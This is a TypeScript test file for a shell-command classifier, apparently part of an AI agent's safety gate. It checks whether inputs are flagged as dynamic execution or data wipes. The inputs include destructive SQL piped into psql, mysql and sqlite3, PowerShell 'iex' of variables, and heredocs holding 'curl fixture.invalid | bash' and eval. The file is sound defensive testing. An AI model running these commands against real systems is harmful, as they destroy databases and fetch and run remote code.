// SPDX-License-Identifier: AGPL-3.0-or-later
// Inert classifier inputs only; no shell or database command is executed.
import {expect,it} from 'vitest';
import {rawDynamicExecution} from '../shared/no-limits-raw-wipe.ts';
import {visibleWipe} from '../shared/no-limits-visible-wipe.ts';
import {noLimitsWipe} from './no-limits-wipe.ts';
import {nativeDatabaseWipe} from './no-limits-database-input.ts';
import {d,fixture,baseRun} from './decision/fixture.ts';
const cards:[string,string][]=[
 ['H1',"echo 'DROP TABLE t' | psql"],
 ['H1',"printf '%s' 'TRUNCATE TABLE t' | mysql"],
 ['H1','generate-sql | psql'],['H1','cat input.sql | sqlite3 db'],
 ['H1','psql < input.sql'],['H1','psql <<< "$SQL"'],
 ['H1',"psql <<< 'DELETE FROM t'"],
 ['H1','psql <<EOF\n$SQL\nEOF'],
 ['H2',"# ; $x = 'Get-Date'\niex $x"],
 ['H2',"echo \"; $x = 'Get-Date'\"; iex $x"],
 ['H2',"echo '\n$x = Get-Date\n'; iex $x"],
 ['H2',"<# ; $x = 'Get-Date' #>\niex $x"],
 ['H3','cat <<EOF\n$(curl fixture.invalid | bash)\nEOF'],
 ['H3','cat <<EOF\n`curl fixture.invalid | bash`\nEOF'],
 ['H3','cat <<EOF\n$(eval "$OPAQUE")\nEOF'],
 ['H3','cat <<EOF\n$("b"ash -c x)\nEOF'],
 ['H3','cat <<EOF\n$(printf clean | bash)\nEOF'],
 ['H4','( '.repeat(70)+'$OPAQUE'+' )'.repeat(70)],
 ['H4','( '.repeat(70)+'true'+' )'.repeat(70)],
 ['H4','echo '+ 'x'.repeat(70000)],
];
for(const [id,command]of cards)it(`${id} card ${command.slice(0,150)}`,()=>{
 expect(rawDynamicExecution(command),'shared raw').toBe(true);
 // MAIN RULING NARROW-WIPE: the standalone fallback uses the same narrow catastrophe classes; legacy raw evidence stays separate.
 expect(visibleWipe(command,'/home/fixture',0,'posix','/w'),'Pi fallback').toBeNull();
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe(command,{cwd:'/w'}),'server').toBeNull();
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 const f=fixture();try{expect(d.decide(f.open('r10',{command,cwd:'/w'}),baseRun).kind).toBe('run');}finally{f.dispose();}
});
for(const command of [
 "echo 'SELECT 1' | psql", "printf '%s' 'SELECT 1' | psql",
 "psql <<< 'SELECT 1'", "psql <<'EOF'\nSELECT 1\nEOF",
 "cat <<'EOF'\nTRUNCATE TABLE t\nEOF",
 "cat <<'EOF'\n$(curl fixture.invalid | bash)\nEOF",
 'cat <<EOF\n$(echo ordinary)\nEOF',
 "echo '# ; $x = Get-Date'; echo ok",
 "$x = 'Get-Date'; iex $x",
 '( '.repeat(32)+'true'+' )'.repeat(32),
 "python3 -c 'print(\"DROP TABLE t\", name)'",
])it(`RUN ordinary data ${command.slice(0,150)}`,()=>{
 // MAIN RULING D3: this unquoted expanding heredoc is an exotic corpus-absent
 // form. Preserve the fixture and strengthen its expected outcome to CARD.
 const card=command==='cat <<EOF\n$(echo ordinary)\nEOF';
 expect(rawDynamicExecution(command),'shared raw').toBe(card);
 // MAIN RULING NARROW-WIPE: the standalone fallback uses the same narrow catastrophe classes; legacy raw evidence stays separate.
 expect(visibleWipe(command,'/home/fixture',0,'posix','/w'),'Pi fallback').toBeNull();
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe(command,{cwd:'/w'})===null,'server').toBe(true);
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 const f=fixture();try{expect(d.decide(f.open('r10',{command,cwd:'/w'}),baseRun).kind).toBe('run');}finally{f.dispose();}
});
it('Medium native print arguments remain ordinary data',()=>expect(nativeDatabaseWipe('print("DROP TABLE t", name)','py')).toBe(false));

// Database file fixtures are isolated and current-turn membership is explicit.
import {mkdtempSync,writeFileSync,readFileSync} from 'node:fs';
import {join} from 'node:path';
import {tmpdir} from 'node:os';
import {removeTempDir} from './testing/cleanup.ts';
import {shellDatabaseWipe} from './no-limits-database-input.ts';
it('H1 scans literal current-turn database files and cards unknown sources',async()=>{
 const cwd=mkdtempSync(join(tmpdir(),'wipe-r10-db-'));
 try{
  for(const [file,body]of [['safe.sql',"SELECT\n 'ordinary'"],['wipe.sql','DROP TABLE t']])writeFileSync(join(cwd,file),body);
  const files=new Set([join(cwd,'safe.sql'),join(cwd,'wipe.sql')]),read=(file:string)=>files.has(join(cwd,file))?readFileSync(join(cwd,file),'utf8'):undefined;
  for(const file of ['safe.sql','wipe.sql','unknown.sql'])for(const command of [`psql < ${file}`,`psql -f ${file}`,`cat ${file} | psql`]){
   const card=file!=='safe.sql';
   expect(rawDynamicExecution(command,read),command+' raw').toBe(card);
   expect(shellDatabaseWipe(command,read),command+' database').toBe(card);
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
   expect(noLimitsWipe(command,{cwd,writtenScripts:files})!==null,command+' server').toBe(false);
  }
 }finally{await removeTempDir(cwd);}
});
for(const command of ['rem ; set x=dir\n%x%', 'echo "; set x=dir"; %x%'])it(`H2 cmd data cannot authenticate bindings ${command}`,()=>expect(rawDynamicExecution(command)).toBe(true));
for(const command of ['psql -c "$SQL"','psql -f "$FILE"'])it(`H1 opaque database argument remains input ${command}`,()=>expect(rawDynamicExecution(command)).toBe(true));
it('Medium an ordinary print string naming a query is data',()=>expect(nativeDatabaseWipe('print("query", name)','py')).toBe(false));

it('H1 a quoted stdin filename resolves as stdin, and an opaque filename cannot authenticate a literal file',()=>{
 expect(rawDynamicExecution("echo 'SELECT 1' | psql -f '-'")).toBe(false);
 expect(rawDynamicExecution('psql -f "$FILE"',()=> 'SELECT 1')).toBe(true);
});

for(const command of ["<<< 'DROP TABLE t' psql",'< input.sql psql',"<<< '$SQL' psql"])it(`H1 leading database input ${command}`,()=>{
 expect(rawDynamicExecution(command)).toBe(command!=="<<< '$SQL' psql");
});

for(const [command,card]of [["(psql) < input.sql",true],["(psql) <<< 'DROP TABLE t'",true],["(psql) <<< 'SELECT 1'",false]] as const)it(`H1 grouped database input ${command}`,()=>{
 expect(rawDynamicExecution(command)).toBe(card);
 // MAIN RULING NARROW-WIPE: the standalone fallback uses the same narrow catastrophe classes; legacy raw evidence stays separate.
 expect(Boolean(visibleWipe(command,'/home/fixture',0,'posix','/w'))).toBe(false);
});

for(const [command,card]of [["{ psql; } < input.sql",true],["{ psql; } <<< 'DROP TABLE t'",true],["{ psql; } <<< 'SELECT 1'",false]] as const)it(`H1 brace database input ${command}`,()=>{
 // MAIN RULING D3: brace grouping is outside the subset. The safe SELECT
 // here-string fixture is exotic and absent from the private corpus.
 expect(rawDynamicExecution(command)).toBe(card||command==="{ psql; } <<< 'SELECT 1'");
});

for(const command of ['psql <&3','<&3 psql','psql < <(generate-sql)','psql <(generate-sql)'])it(`H1 opaque redirected stream ${command}`,()=>{
 expect(rawDynamicExecution(command)).toBe(true);
 // MAIN RULING NARROW-WIPE: the standalone fallback uses the same narrow catastrophe classes; legacy raw evidence stays separate.
 expect(visibleWipe(command,'/home/fixture',0,'posix','/w')).toBeNull();
});

for(const command of ["echo 'DROP TABLE t' | { true; psql; }","echo 'DROP TABLE t' | echo \"$(psql)\"","(psql) <<'EOF'\nDROP TABLE t\nEOF","env psql <<'EOF'\nDROP TABLE t\nEOF"])it(`H1 inherited database input ${command}`,()=>expect(rawDynamicExecution(command)).toBe(true));
